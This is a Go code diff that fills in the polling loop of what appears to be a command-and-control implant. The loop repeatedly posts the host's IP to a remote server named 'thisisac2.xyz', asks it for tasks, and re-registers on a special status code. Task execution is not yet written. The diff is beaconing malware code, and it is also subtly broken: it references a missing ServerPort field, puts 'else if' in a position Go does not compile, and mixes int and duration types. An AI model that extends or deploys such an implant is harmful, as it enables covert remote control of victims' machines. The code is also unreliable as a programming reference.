@@ -103,6 +103,7 @@ func main(){
         LocalIP:  getLocalIP(),
         ServerIP: "thisisac2.xyz",
         Port:     80,
+		CallbackInterval: 60,
 		Client: &http.Client{
             Timeout: 10 * time.Second,
         },
@@ -119,6 +120,46 @@ func main(){
 
 	// Main loop to poll server for tasks
 	for {
-		fmt.Println("Finish later")
+		url := fmt.Sprintf("http://%s:%d/tasks", agent.ServerIP, agent.ServerPort)
+		ip_json := map[string]string{"agent_id": agent.LocalIP}
+		jsonData, err := json.Marshal(ip_json)
+		if err != nil {
+			fmt.Println("Error marshaling JSON:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+		if err != nil {
+			fmt.Println("Error creating request:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		req.Header.Set("Content-Type", "application/json")
+		resp,err := agent.Client.Do(req)
+		if err != nil {
+			fmt.Println("Error sending request:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		io.Copy(io.Discard, resp.Body) // drain the body
+		resp.Body.Close() 
+
+		if resp.StatusCode == 418 {
+            agent.Register()
+            continue
+        }
+
+        if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
+            fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
+            time.Sleep(agent.CallbackInterval * time.Second)
+            continue
+        }
+        else if resp.StatusCode == 204 {
+            // No tasks
+            time.Sleep(agent.CallbackInterval * time.Second)
+            continue
+        }
+
+		// NOW MUST ADD CODE TO HANDLE TASKS
 	}
 }
